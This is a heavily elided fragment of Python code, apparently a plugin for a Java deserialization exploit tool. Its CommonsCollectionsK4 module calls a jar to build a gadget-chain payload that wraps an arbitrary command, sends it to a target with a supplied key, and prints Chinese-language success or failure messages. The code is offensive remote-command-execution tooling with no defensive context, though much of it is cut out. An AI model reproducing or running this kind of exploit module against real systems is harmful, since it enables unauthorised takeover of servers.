...
@Idea.plugin_register('Class5:CommonsCollectionsK4')
class CommonsCollectionsK4(object):
    ...
    def generator(self, key, target, command, file_path=JAR_FILE):
        ...
        popen = subprocess.Popen(
            ['java', '-jar', file_path, 'CommonsCollectionsK4', command],
        ...
        try:
            ...
            if resp.status_code == 200:
                print(
                    "[+]CommonsCollectionsK4模块key: {} 已成功发送! 状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
            else:
                print(
                    "[-]CommonsCollectionsK4模块key: {} 发送异常! 状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
        except Exception:
